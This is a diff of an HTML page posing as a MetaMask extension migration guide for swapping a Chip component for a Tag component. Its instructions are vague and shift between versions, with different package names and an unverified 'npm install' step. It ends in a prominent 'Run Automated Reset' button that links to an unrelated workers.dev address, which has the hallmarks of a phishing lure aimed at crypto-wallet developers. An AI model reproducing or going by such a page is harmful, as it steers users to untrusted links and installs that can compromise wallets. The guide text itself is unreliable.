@@ -3,7 +3,7 @@
 <head><meta charset="UTF-8"><title>Metamask Extension Replace Deprecated Chip Component With Tag F</title>
 <style>
     body {
-        font-family: -apple-system;
+        font-family: BlinkMacSystemFont;
         background: #1a1a24;
         color: #ddd;
         padding: 20px;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: none;
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #00adb5; }
+    a { color: #ff9455; }
     .btn {
-        background: #ff7b2c;
+        background: #00adb5;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -49,20 +49,19 @@
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Update the component imports to use the new Tag component: </li>
-<li>Replace <code>import { Chip } from '@material-ui/core';</code> with <code>import { Tag } from '@component-library/tag';</code></li>
-<li>Update the component usage to match the new Tag component API</li>
-<li>Verify that the new component is properly styled and functional</li>
+<li>Update the component-library to the latest version using <code>npm install @component-library/latest</code></li>
+<li>Replace all instances of the Chip component with the Tag component in the Metamask extension code</li>
+<li>Use the following code to import and use the Tag component:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>npm<span class="w"> </span>install<span class="w"> </span>@component-library/tag
+<div class="codehilite"><pre><span></span><code>import<span class="w"> </span><span class="o">{</span><span class="w"> </span>Tag<span class="w"> </span><span class="o">}</span><span class="w"> </span>from<span class="w"> </span><span class="s1">&#39;@component-library&#39;</span><span class="p">;</span>
 </code></pre></div>
 
-<p>Consider using an external console to verify the changes, for a more detailed output use a terminal. </p>
+<p>Consider utilizing a separate terminal window for executing these commands.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Node.js and npm installed on the system</li>
-<li>The @component-library/tag package is compatible with the current project version</li>
-<li>The Metamask extension is properly configured and connected to the Ethereum network</li>
+<li>Node.js (version 16 or higher) installed on the system</li>
+<li>npm (version 8 or higher) installed on the system</li>
+<li>Metamask extension source code accessible for modification</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
